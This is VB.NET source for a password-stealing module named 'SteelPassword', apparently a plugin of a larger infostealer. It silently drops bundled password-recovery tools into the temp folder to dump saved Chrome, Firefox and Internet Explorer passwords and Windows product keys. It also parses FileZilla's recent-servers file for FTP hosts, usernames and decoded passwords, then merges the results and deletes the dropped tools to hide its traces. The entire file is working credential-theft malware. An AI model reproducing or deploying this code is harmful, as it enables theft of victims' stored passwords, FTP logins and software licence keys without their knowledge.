﻿Imports System.IO
Imports System.Threading
Imports System.Windows.Forms
Imports System.Text.RegularExpressions
Imports System.Text
Public Class SteelPassword
    Dim Data As String
    Public a As String
    Public Function Dump()
        FileZillaStealer()
        Dim result As String
        Try
            File.WriteAllBytes(IO.Path.GetTempPath & "\ChromePass.exe", My.Resources.ChromePass)
            File.WriteAllBytes(IO.Path.GetTempPath & "\iepv.exe", My.Resources.iepv)
            If getOSPlatForm() = "x64" Then
                File.WriteAllBytes(IO.Path.GetTempPath & "\PasswordFirefox64.exe", My.Resources.PasswordFox)
                File.WriteAllBytes(IO.Path.GetTempPath & "\ProduKey64.exe", My.Resources.ProduKey64)
                Shell(IO.Path.GetTempPath & "\PasswordFirefox64.exe /stext " & IO.Path.GetTempPath & "\" & "passlist1.txt")
                Shell(IO.Path.GetTempPath & "\ProduKey64.exe /stext " & IO.Path.GetTempPath & "\" & "passlist2.txt")
            ElseIf getOSPlatForm() = "x86" Then
                File.WriteAllBytes(IO.Path.GetTempPath & "\PasswordFirefox32.exe", My.Resources.PasswordFox32)
                File.WriteAllBytes(IO.Path.GetTempPath & "\ProduKey32.exe", My.Resources.ProduKey32)
                Shell(IO.Path.GetTempPath & "\PasswordFirefox32.exe /stext " & IO.Path.GetTempPath & "\" & "passlist1.txt")
                Shell(IO.Path.GetTempPath & "\ProduKey32.exe /stext " & IO.Path.GetTempPath & "\" & "passlist2.txt")
            End If
            Shell(IO.Path.GetTempPath & "\ChromePass.exe /stext " & IO.Path.GetTempPath & "\" & "passlist3.txt")
            Shell(IO.Path.GetTempPath & "\iepv.exe /stext " & IO.Path.GetTempPath & "\" & "passlist4.txt")
            IO.File.WriteAllText(IO.Path.GetTempPath & "\" & "filezilla.txt", "-------------------[ FTP Data ]-------------------" & vbNewLine & Data & "--------------------------------------------------")
            result = CleanPasswords(IO.Path.GetTempPath & "\" & "passlist1.txt") &
                CleanPasswords(IO.Path.GetTempPath & "\" & "passlist2.txt") &
                CleanPasswords(IO.Path.GetTempPath & "\" & "passlist3.txt") &
                CleanPasswords(IO.Path.GetTempPath & "\" & "passlist4.txt") &
                vbNewLine & IO.File.ReadAllText(IO.Path.GetTempPath & "\" & "filezilla.txt")
            IO.File.Delete(IO.Path.GetTempPath & "\passlist1.txt")
            IO.File.Delete(IO.Path.GetTempPath & "\passlist2.txt")
            IO.File.Delete(IO.Path.GetTempPath & "\passlis3.txt")
            IO.File.Delete(IO.Path.GetTempPath & "\passlis4.txt")

            If File.Exists(IO.Path.GetTempPath & "\ChromePass.exe") Then
                IO.File.Delete(IO.Path.GetTempPath & "\ChromePass.exe")
            End If
            If File.Exists(IO.Path.GetTempPath & "\iepv.exe") Then
                IO.File.Delete(IO.Path.GetTempPath & "\iepv.exe")
            End If
            If File.Exists(IO.Path.GetTempPath & "\PasswordFirefox64.exe") Then
                IO.File.Delete(IO.Path.GetTempPath & "\PasswordFirefox64.exe")
            End If
            If File.Exists(IO.Path.GetTempPath & "\ProduKey64.exe") Then
                IO.File.Delete(IO.Path.GetTempPath & "\ProduKey64.exe")
            End If
            If File.Exists(IO.Path.GetTempPath & "\PasswordFirefox32.exe") Then
                IO.File.Delete(IO.Path.GetTempPath & "\PasswordFirefox32.exe")
            End If
            If File.Exists(IO.Path.GetTempPath & "\ProduKey32.exe") Then
                IO.File.Delete(IO.Path.GetTempPath & "\ProduKey32.exe")
            End If
        Catch ex As Exception
            ' MsgBox(ex.Message)
        End Try
        Return result
    End Function
    Function getOSPlatForm() As String
        Dim OsPlatForm As String = Nothing
        If IntPtr.Size * 8 = 32 Then
            OsPlatForm = "x86"
        Else
            OsPlatForm = "x64"
        End If
        Return OsPlatForm
    End Function
    Public Sub FileZillaStealer()
        Try
            Dim datafile As String() = Split(IO.File.ReadAllText(Environ("APPDATA") & "\FileZilla\recentservers.xml"), "<Server>")
            For Each user As String In datafile
                Dim spliter = Split(user, vbNewLine)
                For Each I As String In spliter
                    If I.Contains("<Host>") Then
                        Data += "Host : " & Split(Split(I, "<Host>")(1), "</Host>")(0) & vbNewLine
                    End If
                    If I.Contains("<User>") Then
                        Data += "Username : " & Split(Split(I, "<User>")(1), "</User>")(0) & vbNewLine
                    End If
                    If I.Contains("<Pass " & My.Resources.String1 & ">") Then
                        Data += "Password : " & DEB(Split(Split(I, "<Pass " & My.Resources.String1 & ">")(1), "</Pass>")(0)) & vbNewLine
                    End If
                    If I.Contains("<Pass>") Then
                        Data += "Password : " & Split(Split(I, "<Pass>")(1), "</Pass>")(0)
                    End If
                Next
            Next

        Catch
            Data += "FileZilla Does Not Contains any Passwords." & vbNewLine & "or the plugin does not support the current filezilla version." & vbNewLine
        End Try
    End Sub
    Public Function DEB(ByRef s As String) As String
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public Function CleanPasswords(ByVal PasswordFile As String)
        Dim TextBox1 As New TextBox
        TextBox1.Multiline = True
        Dim A() As String = IO.File.ReadAllLines(PasswordFile)
        If A.Length = 0 Then

        Else
            For Each line As String In A
                If line.Contains("Origin URL        :") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Password Field    :") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("User Name Field   :") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Password Strength :") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Created Time      :") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Password Strength :") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Password File     : ") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Installation Folder : ") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Service Pack      :") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Build Number      :") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Computer Name     :") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Modified Time     :") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Record Index      :") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Signons File      :") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("HTTP Realm        :") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Firefox Version   :") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Last Time Used    :") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Password Change Time:") Then
                    line = line.Replace(line, "")
                End If

                If line.Contains("Password Use Count:") Then
                    line = line.Replace(line, "")
                End If

                line = line.Replace("==================================================", "--------------------------------------------------")
                TextBox1.AppendText(vbNewLine & line)
            Next
            Dim tmp() As String = TextBox1.Text.Split(CChar(vbNewLine))
            TextBox1.Clear()
            For Each lines As String In tmp
                If lines.Length > 1 Then
                    TextBox1.AppendText(lines)
                End If
            Next
            Return TextBox1.Text
        End If
    End Function
End Class